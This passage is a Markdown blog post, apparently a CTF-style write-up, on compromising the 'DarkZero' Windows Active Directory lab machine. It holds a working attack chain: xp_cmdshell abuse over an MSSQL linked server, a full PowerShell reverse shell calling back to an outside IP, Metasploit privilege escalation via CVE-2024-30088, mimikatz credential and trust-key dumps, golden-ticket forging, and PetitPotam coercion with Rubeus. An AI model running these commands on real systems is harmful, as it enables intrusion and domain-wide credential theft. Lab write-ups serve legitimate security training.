@@ -1,0 +1,795 @@
+---
+layout: post
+title: "DarkZero"
+date: 2025-10-07 01:00:00 -0400
+author: Hugo Beaulieu
+categories: windows machine
+tags: windows active-directory mssql linked-servers xp_cmdshell petitpotam dcsync cve-2024-30088 bloodhound mimikatz rubeus
+---
+
+## Overview
+
+DarkZero is a Windows Active Directory machine featuring a multi-domain environment with trust relationships. The exploitation chain involves MSSQL linked server enumeration to discover a trust relationship between darkzero.htb and darkzero.ext domains, remote code execution via xp_cmdshell on the linked server, privilege escalation through CVE-2024-30088, and lateral movement using DCSync attack with a captured DC machine TGT obtained via PetitPotam coercion.
+
+## Initial Enumeration
+
+We start with credentials for the following account: john.w / RFulUtONCOL!
+
+### Nmap Scan
+
+We begin by scanning the target with nmap to identify open ports and services:
+
+```bash
+nmap -sV -v darkzero.htb
+```
+
+#### TCP Results
+
+```
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1433/tcp  open  ms-sql-s
+2179/tcp  open  vmrdp
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49667/tcp open  unknown
+49670/tcp open  unknown
+49671/tcp open  unknown
+49891/tcp open  unknown
+49963/tcp open  unknown
+59848/tcp open  unknown
+```
+
+This reveals a Windows domain controller with typical Active Directory services including DNS, Kerberos, LDAP, and MSSQL Server on port 1433.
+
+#### UDP Results
+
+We also perform a UDP scan:
+
+```bash
+nmap -sU --top-ports 100 darkzero.htb
+```
+
+```
+PORT    STATE SERVICE
+53/udp  open  domain
+88/udp  open  kerberos-sec
+123/udp open  ntp
+389/udp open  ldap
+```
+
+### Domain Enumeration with enum4linux
+
+To gather more information about the Active Directory environment, we use enum4linux with our credentials:
+
+```bash
+enum4linux -u 'john.w' -p 'RFulUtONCOL!' darkzero.htb
+```
+
+```
+Domain Information:
+  NetBIOS computer name: DC01
+  NetBIOS domain name: darkzero
+  DNS domain: darkzero.htb
+  FQDN: DC01.darkzero.htb
+
+OS Information:
+  OS: Windows Server 2019/2016
+  OS version: 10.0
+  Server type: Domain Controller with SQL Server
+
+Domain Users:
+  - Administrator
+  - Guest
+  - krbtgt
+  - john.w (our account)
+
+Notable Groups:
+  - SQLServer2005SQLBrowserUser$DC01 (indicates SQL Server presence)
+  - Standard domain groups (Domain Admins, Enterprise Admins, etc.)
+
+Domain Password Policy:
+  - Minimum password length: 7
+  - Password complexity: Enabled
+  - Lockout threshold: None
+```
+
+### BloodHound Analysis
+
+We use BloodHound to analyze Active Directory attack paths and determine if our user has any paths to high-value targets:
+
+```bash
+bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb -ns 10.129.x.x -c all
+```
+
+Analysis results for user `john.w`:
+
+```
+OVERVIEW
+  Sessions: 0
+  Reachable High Value Targets: 0
+  First Degree Object Control: 0
+  Group Delegated Object Control: 0
+  Transitive Object Control: 0
+```
+
+The user `john.w` has no direct paths to domain administrator privileges through Active Directory permissions.
+
+### Key Findings
+
+After the initial enumeration phase, we identify several important findings:
+
+- Microsoft SQL Server running on port 1433
+- The presence of the `SQLServer2005SQLBrowserUser$DC01` group indicating SQL Server is installed
+- Our user `john.w` has valid credentials but limited AD permissions
+
+---
+
+## SQL Server Enumeration
+
+With SQL Server identified on port 1433, we attempt to connect using our credentials to explore what data and configurations are available.
+
+### Initial Connection
+
+We connect to the SQL Server using `impacket-mssqlclient` with Windows authentication:
+
+```bash
+impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!@darkzero.htb' -windows-auth
+```
+
+### Database Enumeration
+
+First, we enumerate the available databases:
+
+```sql
+SQL (darkzero\john.w  guest@master)> SELECT name FROM sys.databases;
+name
+------
+master
+
+tempdb
+
+model
+
+msdb
+```
+
+We have access to the standard SQL Server databases, but nothing unusual.
+
+### Linked Server Discovery
+
+Next, we check for linked servers which could provide a path to other systems:
+
+```sql
+SQL (darkzero\john.w  guest@msdb)> EXEC sp_linkedservers;
+SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
+-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------
+DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL
+
+DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL
+```
+
+We discover a linked server: `DC02.darkzero.ext` - indicating a different domain (`darkzero.ext`) with a trust relationship to our current domain (`darkzero.htb`).
+
+### Privilege Check on Linked Server
+
+We verify what privileges we have on this linked server:
+
+```sql
+SQL (darkzero\john.w  guest@msdb)> EXEC ('SELECT SYSTEM_USER') AT [DC02.darkzero.ext];
+
+------------
+dc01_sql_svc
+
+SQL (darkzero\john.w  guest@msdb)> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext];
+
+-
+1
+```
+
+Excellent! We have `sysadmin` privileges on `DC02` and are running as the `dc01_sql_svc` account. This is our path to gaining code execution on the second domain controller.
+
+### Enabling xp_cmdshell
+
+To achieve remote code execution, we need to enable `xp_cmdshell` on the remote server:
+
+```sql
+SQL (darkzero\john.w  guest@msdb)> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+
+SQL (darkzero\john.w  guest@msdb)> EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
+INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+### Testing Command Execution
+
+We verify that command execution works:
+
+```sql
+SQL (darkzero\john.w  guest@msdb)> EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext];
+output
+--------------------
+darkzero-ext\svc_sql
+
+NULL
+
+SQL (darkzero\john.w  guest@msdb)> EXEC ('xp_cmdshell ''hostname''') AT [DC02.darkzero.ext];
+output
+------
+DC02
+
+NULL
+```
+
+Perfect! We have command execution as `darkzero-ext\svc_sql` on `DC02`.
+
+### Searching for Sensitive Files
+
+With command execution established, we explore the file system looking for sensitive data:
+
+```sql
+SQL (darkzero\john.w  guest@msdb)> EXEC ('xp_cmdshell ''dir C:\''') AT [DC02.darkzero.ext];
+```
+
+Interesting! We find a file called `Policy_Backup.inf` in the root of the C: drive - this could contain sensitive information.
+
+### Extracting the Policy Backup File
+
+We retrieve and examine the contents of the policy backup file:
+
+```sql
+EXEC ('xp_cmdshell ''type C:\Policy_Backup.inf''') AT [DC02.darkzero.ext];
+```
+
+The file contains Windows Group Policy settings including:
+
+- **System Access**: Password policies (min length: 7, complexity: enabled, max age: 42 days)
+- **Event Audit**: Audit policy settings (mostly disabled)
+- **Kerberos Policy**: Ticket lifetime and renewal settings
+- **Registry Values**: Extensive security-related registry configurations
+- **Privilege Rights**: SID-to-privilege mappings showing which users/groups have specific Windows privileges
+
+While this file provides valuable information about the domain's security configuration, it does not contain any credentials or directly exploitable data. The primary value is understanding privilege assignments and security policies in the environment.
+
+## Establishing Initial Foothold
+
+With command execution on `DC02` via SQL Server, we now need to establish a more stable foothold on the system.
+
+### Creating a Reverse Shell
+
+We create a PowerShell reverse shell script:
+
+```bash
+cat > revshell.ps1 << 'EOF'
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.79',4444)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+EOF
+```
+
+### Encoding for Execution
+
+PowerShell's `-EncodedCommand` parameter requires UTF-16LE Base64 encoding:
+
+```bash
+iconv -f UTF-8 -t UTF-16LE revshell.ps1 | base64 -w 0
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4ANwA5ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApAAoAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
+```
+
+#### Start listener
+
+```bash
+nc -lvnp 4444
+```
+
+#### Run shell (with SQL Server xp_cmdshell)
+
+```sql
+EXEC ('xp_cmdshell ''powershell -EncodedCommand <BASE64_PAYLOAD>''') AT [DC02.darkzero.ext];
+```
+
+### Shell Access Achieved
+
+We successfully receive a connection back to our listener:
+
+```bash
+listening on [any] 4444 ...
+connect to [10.10.15.79] from (UNKNOWN) [10.129.72.216] 55166
+whoami
+darkzero-ext\svc_sql
+PS C:\Windows\system32>
+```
+
+## Finding Vulnerability
+
+### Privilege Escalation Scans
+
+#### winPEAS
+
+We run winPEAS to enumerate potential privilege escalation vectors:
+
+```bash
+.\winPEASx64.exe
+```
+
+Key findings:
+
+```
+System Information:
+  OS: Microsoft Windows Server 2022 Datacenter
+  Build: 10.0.20348
+  Architecture: x64
+  Hostname: DC02
+  Domain: darkzero.ext
+
+Current User Context:
+  User: darkzero-ext\svc_sql
+  Privileges: Standard user (HighIntegrity: False)
+  Groups: Domain Users, SQL Server service groups
+
+Environment:
+  - Running on a domain controller in the darkzero.ext domain
+  - No immediate privilege escalation paths identified through misconfigured services or permissions
+  - System appears to be a relatively secure baseline configuration
+```
+
+winPEAS does not reveal any obvious misconfigurations or quick wins for privilege escalation. We'll need to look for kernel-level vulnerabilities.
+
+#### PrivescCheck
+
+We also run PrivescCheck for a more comprehensive privilege escalation audit:
+
+```powershell
+Invoke-PrivescCheck
+```
+
+PrivescCheck performs extensive checks across multiple attack categories including:
+
+- User and group enumeration
+- Service misconfigurations
+- Scheduled task permissions
+- Registry permissions
+- File system permissions
+- Credential access opportunities
+
+**Result**: PrivescCheck confirms the findings from winPEAS - the system is well-configured with no obvious misconfigurations or privilege escalation paths through standard techniques. This indicates we'll need to pursue a kernel-level exploit.
+
+### Vulnerability Scan
+
+#### wesng
+
+To identify potential kernel vulnerabilities, we use Windows Exploit Suggester (WES-NG):
+
+```bash
+# Collect system information
+systeminfo > systeminfo.txt
+
+# Run WES-NG
+wes.py systeminfo.txt | tee wesng.txt
+
+# Filter for privilege escalation CVEs
+grep -E "Impact: Elevation of Privilege" wesng.txt -B6 | grep CVE-202 | cut -d' ' -f2 | sort -u
+```
+
+WES-NG identifies 22 missing patches covering over 400 vulnerabilities. After filtering for privilege escalation CVEs and checking for available exploits, we focus on:
+
+**CVE-2024-30088** - Windows Kernel Time of Check Time of Use LPE
+
+- Found in both GitHub and Metasploit
+- Metasploit module: `exploit/windows/local/cve_2024_30088_authz_basep`
+- Rating: Excellent reliability
+- Affects: Windows Server 2022 Build 20348
+
+This vulnerability appears to be our best option for privilege escalation.
+
+## Privilege Escalation - CVE-2024-30088
+
+With CVE-2024-30088 identified as a viable privilege escalation path, we need to prepare our environment for exploitation using Metasploit.
+
+### Upgrading to Meterpreter
+
+To use the Metasploit exploit module, we need to upgrade our PowerShell reverse shell to a Meterpreter session using the `web_delivery` module:
+
+```bash
+use exploit/multi/script/web_delivery
+set LHOST 10.10.15.79
+set LPORT 1337
+set TARGET 2
+set SRVHOST 10.10.15.79
+set SRVPORT 8080
+set PAYLOAD windows/x64/meterpreter/reverse_tcp # Staged (uses slashes /)
+#set PAYLOAD windows/x64/meterpreter_reverse_tcp # Stageless (uses underscore _)
+exploit
+```
+
+The module provides a PowerShell command to execute on the target, which we run through our existing shell.
+
+### Stabilizing the Meterpreter Session
+
+For better exploit reliability, we migrate to a more stable process:
+
+```bash
+sessions -i 1
+execute -H -f 'C:\Windows\System32\notepad.exe'
+ps -S notepad.exe
+
+ PID   PPID  Name         Arch  Session  User                  Path
+ ---   ----  ----         ----  -------  ----                  ----
+ 1140  3604  notepad.exe  x64   0        darkzero-ext\svc_sql  C:\Windows\System32\notepad.exe
+
+migrate 1140
+[*] Migrating from 3604 to 1140...
+[*] Migration completed successfully.
+
+background
+```
+
+### Verifying Exploit Availability
+
+We can verify the exploit is available using Metasploit's local exploit suggester:
+
+```bash
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
+ 4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
+ 6   exploit/windows/local/cve_2024_30085_cloud_files               Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
+ 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
+ 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+```
+
+The suggester confirms `cve_2024_30088_authz_basep` is available and applicable to our target.
+
+### Executing the Exploit
+
+We configure and run the CVE-2024-30088 exploit to escalate to SYSTEM:
+
+```bash
+>> sessions
+use exploit/windows/local/cve_2024_30088_authz_basep
+set LHOST 10.10.15.79
+set LPORT 6969
+set SESSION 1
+exploit
+```
+
+When we run the exploit the first time, we get:
+
+```bash
+[*] 172.16.20.2 - Meterpreter session 1 closed.  Reason: Died
+```
+
+We reestablish a Meterpreter session and check if the notepad.exe process still exist:
+
+```bash
+sessions -i 2
+ps -S notepad.exe
+
+ PID   PPID  Name         Arch  Session  User                  Path
+ ---   ----  ----         ----  -------  ----                  ----
+ 1444  1500  notepad.exe  x64   0        darkzero-ext\svc_sql  C:\Windows\System32\notepad.exe
+```
+
+It does ! We re-migrate to the new existing process and re-run the rexploit:
+
+```bash
+migrate 1444
+[*] Migrating from 3264 to 1444...
+[*] Migration completed successfully.
+background
+
+use exploit/windows/local/cve_2024_30088_authz_basep
+set LHOST 10.10.15.79
+set LPORT 6969
+set SESSION 2
+exploit
+
+[*] Started reverse TCP handler on 10.10.15.79:6969
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 2113
+[*] Reflectively injecting the DLL into 3280...
+[+] The exploit was successful, reading SYSTEM token from memory...
+[+] Successfully stole winlogon handle: 788
+[+] Successfully retrieved winlogon pid: 600
+[*] Sending stage (203846 bytes) to 10.129.253.91
+[*] Meterpreter session 3 opened (10.10.15.79:6969 -> 10.129.138.189:61064) at 2025-10-13 15:50:46 -0400
+
+sessions
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  2         meterpreter x64/windows  darkzero-ext\svc_sql @ DC02  10.10.15.79:1337 -> 10.129.253.91:50336 (172.16.20.2)
+  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DC02   10.10.15.79:6969 -> 10.129.253.91:50341 (172.16.20.2)
+
+sessions -i 3
+shell
+```
+
+Success! We now have SYSTEM-level access on DC02 in the `darkzero.ext` domain.
+
+## Lateral Movement - Golden Ticket
+
+With SYSTEM privileges on DC02, we can attempt lateral movement to the `darkzero.htb` domain. The presence of a linked server suggests a trust relationship between these domains that we can exploit.
+
+Reference: [Golden Ticket Attack](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)
+
+### Trust Enumeration
+
+We begin by enumerating the domain trust relationship using PowerView:
+
+```powershell
+Get-DomainTrust
+SourceName      : darkzero.ext
+TargetName      : darkzero.htb
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 7/29/2025 3:30:19 PM
+WhenChanged     : 9/29/2025 6:25:18 PM
+
+
+
+# Get name of DC of the other domain
+Get-DomainComputer -Domain darkzero.htb -Properties DNSHostName
+dnshostname
+-----------
+DC01.darkzero.htb
+
+
+
+
+# Enumerate the other domain using the -Domain
+Get-DomainUser -SPN -Domain darkzero.htb | select SamAccountName
+samaccountname
+--------------
+krbtgt
+```
+
+This confirms:
+
+- A bidirectional FOREST_TRANSITIVE trust between `darkzero.ext` and `darkzero.htb`
+- DC01 is the domain controller for `darkzero.htb`
+- The trust was established in July 2025
+
+### Checking SID Filtering
+
+We also need to check if SID filtering is enabled
+
+```shell
+netdom trust darkzero.ext /domain:darkzero.htb /quarantine
+
+SID filtering is not enabled for this trust. All SIDs presented in an
+authentication request from this domain will be honored.
+```
+
+### Dumping Secrets from DC02
+
+With SYSTEM privileges on DC02, we have full access to the domain controller's security database. We can use mimikatz to extract critical secrets including NTLM password hashes and the trust keys that secure the inter-domain trust relationship:
+
+#### NTLM Hashes
+
+Using mimikatz's `lsadump::lsa` module, we extract the NTLM hashes for all domain accounts:
+
+```powershell
+C:\Users\Administrator\Documents\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 6963aad8ba1150192f3ca6341355eb49
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 43e27ea2be22babce4fbcff3bc409a9d
+
+RID  : 0000044f (1103)
+User : svc_sql
+LM   :
+NTLM : 816ccb849956b531db139346751db65f
+
+RID  : 000003e8 (1000)
+User : DC02$
+LM   :
+NTLM : 663a13eb19800202721db4225eadc38e
+
+RID  : 00000451 (1105)
+User : darkzero$
+LM   :
+NTLM : 4276fdf209008f4988fa8c33d65a2f94
+```
+
+#### Trust Keys
+
+Trust keys are the cryptographic secrets used to secure authentication between the two domains. By extracting these keys, we can potentially forge inter-realm TGTs (Ticket Granting Tickets) that allow us to authenticate from `darkzero.ext` to `darkzero.htb`. We use mimikatz's `lsadump::trust` module to extract the trust keys:
+
+```powershell
+C:\Users\Administrator\Documents\mimikatz.exe "privilege::debug" "lsadump::trust /patch" exit
+
+
+Current domain: DARKZERO.EXT (darkzero-ext / S-1-5-21-1969715525-31638512-2552845157)
+
+Domain: DARKZERO.HTB (darkzero / S-1-5-21-1152179935-589108180-1989892463)
+ [  In ] DARKZERO.EXT -> DARKZERO.HTB
+    * 9/29/2025 11:25:18 AM - CLEAR   - a0 67 5a 80 37 bb f8 07 7b 07 77 b6 1b 8e a6 b3 d2 49 0b 9c ac 9c 9a b2 00 35 1e 64 c7 8d a4 48 ec cf 46 7a 8c 2c b1 c6 ee 6c e2 f0 1c b2 41 f2 df ea 98 e7 cd 8c a9 e5 37 5e 26 c6 d1 19 74 3a 05 fa 87 2f e9 29 eb f4 42 2d b4 4e f5 f0 53 89 b9 d2 4e 2d f2 a3 36 ad 17 3e 9d 91 d8 25 19 44 d5 27 e8 22 b6 23 f2 05 f8 46 c4 60 97 dd fd d8 82 25 4d 72 8a a6 ef 6e f7 94 b1 5e 65 9c a7 41 05 4f 80 a8 7d ca 85 a3 cc 25 dc c0 04 2d d8 73 14 dc d1 42 74 04 43 34 28 4b 6b 9d a1 0d 57 44 78 f3 01 99 ba f9 d1 02 d8 20 06 b9 21 c0 78 76 c9 71 4d 78 b5 d7 8a 4a b7 48 9c ae 6d 91 cc ac 9e b3 ee 8f ed d6 88 2f 6c 5c f9 d1 80 cc 1a 2a 43 c1 ae 2d 1d 33 2d fe be c9 18 52 d1 08 2c 30 7d 49 21 48 72 6f c2 f3 f7 5a 16 bf d7 7f 35 54
+	* aes256_hmac       e3d16e9a18a3abc282ce8b07b8248ba903ee0a85b3b75d4143896d80d98c4293
+	* aes128_hmac       5e2c333c8734bb024265a3e7dfb014c0
+	* rc4_hmac_nt       4276fdf209008f4988fa8c33d65a2f94
+
+ [ Out ] DARKZERO.HTB -> DARKZERO.EXT
+    * 9/22/2025 12:02:38 PM - CLEAR   - c2 f5 b7 bd 92 f7 67 47 42 76 31 1e a1 c1 cb 2b 43 27 3f 3b 51 89 b4 cb 55 75 76 40 51 f9 f4 3a 4b 5c 3b 35 88 27 33 d0 77 26 64 60 63 23 03 4a 9a c0 1d 29 14 04 ad 03 48 fb 3e 76 47 f8 66 d9 15 6c 08 28 c9 52 07 d0 cf 79 88 8b 45 16 a1 d6 cc 4b 1b b2 7c 73 e7 7b c9 73 2d aa 5a c2 c5 8f 25 2d 83 8f 21 6e 4a 96 04 dd 32 2f 61 23 cd e1 71 7a 24 bd aa ae 4d e1 a0 c0 f0 63 89 90 99 fb d1 f8 73 9e 08 df fe b2 bd 35 e5 ed bb 1f ee 4b bf a6 98 35 45 cc 19 57 b8 a3 be 5a 64 32 67 b4 71 5d 5a 9a 53 9b 3a 12 3f b6 7f 5c 2f fa aa c9 77 94 1b c8 7e b4 79 d0 9a a9 26 60 74 79 e6 39 c4 21 bc 54 6e f1 e6 25 a5 da 5d 44 f9 64 d1 aa 39 67 b9 cd 1d fa c1 2f 32 f8 cf 31 2f bb 1b 5e fb 20 65 e8 c4 ca 1a 11 18 45 51 4c 3c 19 41 58
+	* aes256_hmac       8c7b7595f340c8811f6bf2fdda35d0e9f670c347b177bd6e590d39c11c137d74
+	* aes128_hmac       d635f53a9201a6e23fa898a4bab41ef8
+	* rc4_hmac_nt       95e4ba6219aced32642afa4661781d4b
+
+ [ In-1] DARKZERO.EXT -> DARKZERO.HTB
+    * 7/29/2025 8:30:19 AM - CLEAR   - 55 00 4e 00 75 00 3d 00 6e 00 75 00 45 00 59 00 5b 00 77 00 74 00 7c 00 56 00 42 00 74 00
+	* aes256_hmac       97951af794202832ceab4ace1d62d3ccce27cac92b1cb34c29abbb54d52fdcb2
+	* aes128_hmac       8d9f5b88a526863f2e5c2dbd7937341f
+	* rc4_hmac_nt       4e1e0cb1a5c28010572b3d725e9a164e
+
+ [Out-1] DARKZERO.HTB -> DARKZERO.EXT
+    * 9/22/2025 12:02:38 PM - CLEAR   - 55 00 4e 00 75 00 3d 00 6e 00 75 00 45 00 59 00 5b 00 77 00 74 00 7c 00 56 00 42 00 74 00
+	* aes256_hmac       afcd2ae4306b690a2785aadcd8757890e48a0e82635b358c3b19469f65d312dc
+	* aes128_hmac       6bdcabcdbf7919f8db95d40d6f14f537
+	* rc4_hmac_nt       4e1e0cb1a5c28010572b3d725e9a164e
+
+```
+
+### Forging an Inter-Realm Golden Ticket
+
+With the trust keys and domain SIDs extracted, we attempt to forge a golden ticket that will allow us to authenticate as Administrator from `darkzero.ext` to `darkzero.htb`.
+
+A key observation: the NTLM hash for the `darkzero$` trust account (`4276fdf209008f4988fa8c33d65a2f94`) matches the `rc4_hmac_nt` value for the `DARKZERO.EXT -> DARKZERO.HTB` trust direction. This trust key can be used to create an inter-realm TGT. We also inject the Enterprise Admins SID (`S-1-5-21-1152179935-589108180-1989892463-519`) to escalate privileges in the target domain:
+
+```powershell
+C:\Users\Administrator\Documents\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /user:Administrator /domain:darkzero.ext /sid:S-1-5-21-1969715525-31638512-2552845157 /rc4:4276fdf209008f4988fa8c33d65a2f94 /service:krbtgt /target:darkzero.htb /sids:S-1-5-21-1152179935-589108180-1989892463-519 /ptt" exit
+```
+
+### Golden Ticket Approach Fails
+
+After forging and injecting the golden ticket, we verify that the ticket is loaded in memory using `klist`. The ticket appears valid, showing we have a TGT for `krbtgt/darkzero.htb` issued from `darkzero.ext`:
+
+```powershell
+klist
+```
+
+However, when we attempt to access resources on DC01 in the target domain, we encounter an access denied error:
+
+```powershell
+klist
+
+#0> Client: Administrator @ darkzero.ext
+Server: krbtgt/darkzero.htb @ darkzero.ext
+KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
+Start Time: 10/13/2025 23:38:10 (local)
+End Time: 10/11/2035 23:38:10 (local)
+Renew Time: 10/11/2035 23:38:10 (local)
+Session Key Type: RSADSI RC4-HMAC(NT)
+Cache Flags: 0
+Kdc Called:
+
+dir \\DC01.darkzero.htb\C$
+dir : Access is denied
+```
+
+This indicates that despite having a seemingly valid inter-realm TGT with the Enterprise Admins SID injected, additional security controls or trust configurations are preventing us from accessing the target domain. We need an alternative approach.
+
+## Lateral Movement - DCSync via Captured TGT
+
+Since the golden ticket approach failed, we employ an alternative technique: DCSync using a legitimately captured TGT from a domain controller machine account. This method is based on the approach documented at [HackTricks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html#dcsync-using-a-captured-dc-machine-tgt-ccache).
+
+The strategy involves:
+
+1. Coercing DC01 (in `darkzero.htb`) to authenticate to DC02 (in `darkzero.ext`) using PetitPotam
+2. Capturing the TGT for the DC02$ machine account during this authentication
+3. Using this legitimate cross-realm TGT to perform DCSync against `darkzero.htb`
+
+### Capturing DC02's TGT
+
+First, we set up Rubeus to monitor for new Kerberos tickets. Then, we use PetitPotam to coerce DC01 to authenticate to DC02, which will cause DC02 to request a TGT for accessing DC01's domain:
+
+```powershell
+# Start Rubeus monitor in the background to capture ticket
+Start-Job -ScriptBlock { C:\Users\Administrator\Documents\Rubeus.exe monitor /interval:5 /nowrap }
+
+# Give Rubeus time to start
+Start-Sleep -Seconds 5
+
+# Start PetitPotam to force DC01 to authenticate to DC02
+C:\Users\Administrator\Documents\PetitPotam.exe DC02.darkzero.ext DC01.darkzero.htb 1
+
+# Check Rubeus background job for ticket
+Receive-Job -Id 1
+
+[*] 10/11/2025 9:36:55 PM UTC - Found new TGT:
+
+  User                  :  DC02$@DARKZERO.EXT
+  StartTime             :  10/11/2025 2:36:50 PM
+  EndTime               :  10/11/2025 8:06:11 PM
+  RenewTill             :  10/18/2025 10:06:11 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
+  Base64EncodedTicket   :
+
+[<base64 ticket content displayed here>]
+```
+
+### Analyzing the Captured Ticket
+
+Rubeus successfully captured a TGT when DC02 authenticated to DC01. We extract the base64-encoded ticket and verify its contents to ensure it's the correct cross-realm TGT:
+
+```powershell
+# Copy the base64 ticket (usually the last one captured)
